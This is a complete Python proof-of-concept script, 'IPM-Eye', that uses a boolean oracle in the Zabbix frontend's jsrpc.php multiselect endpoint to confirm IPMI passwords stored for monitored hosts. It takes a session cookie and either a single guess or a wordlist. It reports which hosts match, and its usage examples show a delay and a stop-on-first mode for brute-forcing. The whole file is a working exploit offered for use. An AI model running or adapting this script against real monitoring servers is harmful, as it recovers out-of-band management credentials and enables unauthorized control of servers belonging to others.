#!/usr/bin/env python3

import requests
import argparse
import sys
import time
import urllib.parse
from pathlib import Path

IPMI_PASSWORD_MAX_LEN = 20


def check_password(session: requests.Session, zbx_url: str, guess: str,
                   delay: float = 0.0) -> tuple[bool, list]:
    if delay:
        time.sleep(delay)

    payload = (
        "method=multiselect.get"
        "&object_name=hosts"
        f"&filter[ipmi_password]={urllib.parse.quote(guess, safe='')}"
    )

    try:
        r = session.post(
            f"{zbx_url}/jsrpc.php?type=11",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=10,
        )
        r.raise_for_status()
        result = r.json().get("result", [])
        return len(result) > 0, result

    except requests.exceptions.Timeout:
        print("[!] Request timed out.", file=sys.stderr)
        return False, []
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        return False, []
    except (ValueError, KeyError) as e:
        print(f"[!] Failed to parse JSON response: {e}", file=sys.stderr)
        return False, []


def build_session(cookie: str, verify_ssl: bool) -> requests.Session:
    session = requests.Session()
    session.verify = verify_ssl
    name, _, value = cookie.partition("=")
    session.cookies.set(name.strip(), value.strip())
    return session


def print_hit(guess: str, hosts: list) -> None:
    print(f"\n[+] HIT: ipmi_password = {guess!r}")
    print("[+] Affected host(s):")
    for h in hosts:
        print(f"    - {h.get('name', '?')}  (id: {h.get('id', '?')})")


def single_mode(session: requests.Session, zbx_url: str,
                guess: str, delay: float) -> None:
    if len(guess) > IPMI_PASSWORD_MAX_LEN:
        print(f"[!] Guess exceeds max length ({IPMI_PASSWORD_MAX_LEN}). Aborting.")
        sys.exit(1)

    print(f"[*] Target : {zbx_url}")
    print(f"[*] Guess  : {guess!r}")
    print("-" * 50)

    hit, hosts = check_password(session, zbx_url, guess, delay)
    if hit:
        print_hit(guess, hosts)
    else:
        print("[-] No match.")


def wordlist_mode(session: requests.Session, zbx_url: str, wordlist_path: str,
                  delay: float, stop_on_first: bool) -> None:
    wl = Path(wordlist_path)
    if not wl.exists():
        print(f"[!] Wordlist not found: {wordlist_path}")
        sys.exit(1)

    words = [line.strip() for line in wl.read_text(errors="ignore").splitlines()
             if line.strip()]

    print(f"[*] Target   : {zbx_url}")
    print(f"[*] Wordlist : {wordlist_path} ({len(words)} entries)")
    print(f"[*] Delay    : {delay}s per request")
    print("-" * 50)

    found = []
    skipped = 0

    try:
        for i, guess in enumerate(words, 1):
            if len(guess) > IPMI_PASSWORD_MAX_LEN:
                skipped += 1
                continue

            print(f"[{i}/{len(words)}] Trying: {guess!r}", end="  ", flush=True)
            hit, hosts = check_password(session, zbx_url, guess, delay)

            if hit:
                print("<-- HIT!")
                found.append((guess, hosts))
                if stop_on_first:
                    break
            else:
                print("miss")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    print("\n" + "=" * 50)
    if skipped:
        print(f"[~] Skipped {skipped} entries exceeding max length ({IPMI_PASSWORD_MAX_LEN}).")
    if found:
        print(f"[+] Found {len(found)} matching password(s):")
        for pw, hosts in found:
            print_hit(pw, hosts)
    else:
        print("[-] No matches found.")


def main():
    parser = argparse.ArgumentParser(
        description="Zabbix IPMI Password Boolean Oracle — PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python IPM-Eye.py -u http://zabbix.lab \\
      --cookie "zbx_session=abc123def456" \\
      --guess "admin123"

  python IPM-Eye.py -u http://zabbix.lab \\
      --cookie "zbx_session=abc123def456" \\
      --wordlist passwords.txt --stop-on-first --delay 0.3
        """
    )

    parser.add_argument("-u", "--url", required=True,
                        help="Zabbix base URL (e.g. http://zabbix.lab)")
    parser.add_argument("--cookie", required=True, metavar="COOKIE",
                        help='Session cookie (e.g. "zbx_session=abc123")')

    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--guess", metavar="PASSWORD",
                            help="Single password to check")
    mode_group.add_argument("--wordlist", metavar="FILE",
                            help="Path to wordlist file (one password per line)")

    parser.add_argument("--delay", type=float, default=0.0,
                        help="Delay in seconds between requests (default: 0)")
    parser.add_argument("--stop-on-first", action="store_true",
                        help="Stop after the first match (wordlist mode only)")
    parser.add_argument("--no-verify-ssl", action="store_true",
                        help="Disable SSL certificate verification")

    args = parser.parse_args()

    zbx_url = args.url.rstrip("/")
    verify_ssl = not args.no_verify_ssl

    if not verify_ssl:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    session = build_session(args.cookie, verify_ssl)

    if args.guess:
        single_mode(session, zbx_url, args.guess, args.delay)
    else:
        wordlist_mode(session, zbx_url, args.wordlist, args.delay, args.stop_on_first)


if __name__ == "__main__":
    main()
